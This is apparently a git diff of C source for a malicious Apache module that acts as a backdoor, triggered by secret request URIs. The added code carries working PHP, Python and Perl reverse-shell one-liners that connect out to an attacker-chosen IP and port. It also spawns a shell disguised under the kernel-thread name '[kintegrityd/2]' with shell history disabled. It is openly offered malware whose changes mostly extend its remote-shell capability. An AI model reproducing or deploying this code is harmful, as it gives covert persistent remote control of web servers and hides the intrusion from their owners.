@@ -1,5 +1,8 @@
-//Socks5 code from https://github.com/fgssfgss/socks_proxy
 /* Code inspired from @TheXC3LL */
+// https://www.tarlogic.com/en/blog/backdoors-modulos-apache/
+/* ************************************************************* */
+//Socks5 code from https://github.com/fgssfgss/socks_proxy
+/* ************************************************************* */
 
 /* Backdoor module (@RicoVlad) */
 
@@ -22,6 +25,7 @@
 #include <dirent.h>
 #include <sys/un.h>
 // forkpty() --> https://linux.die.net/man/3/forkpty
+// Need to link with libutil to use it in apache2 module
 #include <pty.h>
 #include <utmp.h>
 
@@ -254,75 +258,56 @@ void shell(int socket) {
 	return;
 }
 void restartApache(int socket){
-    int input[2];
-    int output[2];
-    int n, sr;
-    char buf[1024];
-    fd_set readset;
-    struct timeval tv;
-    pid_t spid;
 
-    pipe(input);
-    pipe(output);
+    pid_t spid;
 
     spid = fork();
     if (spid < 0) {
         fprintf(stderr, "[-] Error: could not fork");
         exit(EXIT_FAILURE);
     }else if (spid == 0){
-        //char *argv[] = { "[kintegrityd/2]", 0 };
-        //char *envp[] = { "HISTFILE=", 0 };
-        close(input[1]);
-        close(output[0]);
 
-        dup2(socket, 0);
-        dup2(socket, 1);
-        dup2(socket, 2);
-        //execve("/bin/sh", argv, envp);
         char* args[] = {"/usr/bin/systemctl", "restart", "apache2", NULL};
-        //char* args[] = {"/usr/bin/touch","/root/bite.txt",NULL};
-        execve( args[0], args, NULL);
+        execve(args[0], args, NULL);
     }
 
     return;
 }
 
-void reverseShell(int socket,char* ip, char* port){
-    int input[2];
-    int output[2];
-    int n, sr;
-    char buf[1024];
-    fd_set readset;
-    struct timeval tv;
-    pid_t spid;
+void reverseShell(int socket,char* ip, char* port, char* prog){
 
-    pipe(input);
-    pipe(output);
+    pid_t spid;
 
     spid = fork();
     if (spid < 0) {
         fprintf(stderr, "[-] Error: could not fork");
         exit(EXIT_FAILURE);
     }else if (spid == 0){
-        //char *argv[] = { "[kintegrityd/2]", 0 };
-        //char *envp[] = { "HISTFILE=", 0 };
-        close(input[1]);
-        close(output[0]);
 
-        dup2(socket, 0);
-        dup2(socket, 1);
-        dup2(socket, 2);
-        //execve("/bin/sh", argv, envp);
-
-        /*char* args[] = {"/usr/bin/touch", "", NULL};
-        args[1] = malloc(2048);
-        sprintf(args[1],"/root/%s:%s",ip,port);*/
-
-        char* args[] = {"/usr/bin/python", "-c", "", NULL};
-        args[2] = (char*) malloc(2048);
-        sprintf(args[2],"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);",ip,port);
-
-        execve( args[0], args, NULL);
+        if (!strcmp(prog,"php")){
+            char* args[] = {"/usr/bin/php", "-r", "", NULL};
+            args[2] = (char*) malloc(2048);
+            sprintf(args[2],"$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");",ip,port);
+            execve(args[0], args, NULL);
+            free(args[2]);
+        }else if (!strcmp(prog,"python")){
+            char* args[] = {"/usr/bin/python", "-c", "", NULL};
+            args[2] = (char*) malloc(2048);
+            sprintf(args[2],"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);",ip,port);
+            execve(args[0], args, NULL);
+            free(args[2]);
+        }else if (!strcmp(prog,"perl")){
+            char* args[] = {"/usr/bin/perl", "-e", "", NULL};
+            args[2] = (char*) malloc(2048);
+            sprintf(args[2],"use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};",ip,port);
+            execve(args[0], args, NULL);
+        }else{
+            char* args[] = {"/usr/bin/php", "-r", "", NULL};
+            args[2] = (char*) malloc(2048);
+            sprintf(args[2],"$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");",ip,port);
+            execve(args[0], args, NULL);
+            free(args[2]);
+        }
     }
 
     return;
@@ -346,17 +331,9 @@ void shellPTY(int socket) {
 
         char *argv[] = { "[kintegrityd/2]", 0 };
         char *envp[] = { "HISTFILE=", 0 };
-        /*close(input);
-        close(output);*/
 
-        /*dup2(socket, 0);
-        dup2(socket, 1);
-        dup2(socket, 2);*/
         execve("/bin/sh", argv, envp);
-        //execlp("/bin/sh", "[kintegrityd/2]", envp);
-        //execlp("/bin/zsh", "[kworker:01]", NULL);
-        /*char* args[] = {"/bin/bash", "-i", NULL };
-        execlp( args[0], args, NULL);*/
+
     }
     else { // Father process
         tcgetattr(terminalfd, &terminal);
@@ -484,21 +461,10 @@ static int backdoor_post_read_request(request_rec *r) {
             write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
             exit(0);
         }
+
         write(sock,r->uri,strlen(r->uri));
+
         exit(0);
-        //write(fd,r->uri,strlen(r->uri));
-        //write(fd,"coucou",strlen("coucou"));
-
-
-        // reverse/ip/port
-        /*char* reverse = strsep(r->uri,"/");
-
-        char* port = strsep(r->uri,"-");*/
-        /*char* bitur = malloc(2048);
-        sprintf(bitur,"%s:%s",ip,port);
-        write(fd,bitur,strlen(bitur));*/
-
-       /* exit(0);*/
     }
 
 	if (!strcmp(r->uri, SHELLWORD)) {
@@ -633,12 +599,9 @@ backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, ser
                         char* meh = strtok(buf,"/");
                         char* ip = strtok(NULL,"/");
                         char* port = strtok(NULL,"/");
+                        char* prog = strtok(NULL,"/");
 
-					    reverseShell(sd,ip,port);
-					    /*char ip[] = "51.15.5.237";
-					    char port[] ="5555";*/
-					    //write(sd,ip,strlen(ip));
-
+                        reverseShell(sd,ip,port,prog);
 					}
 				}
 			}
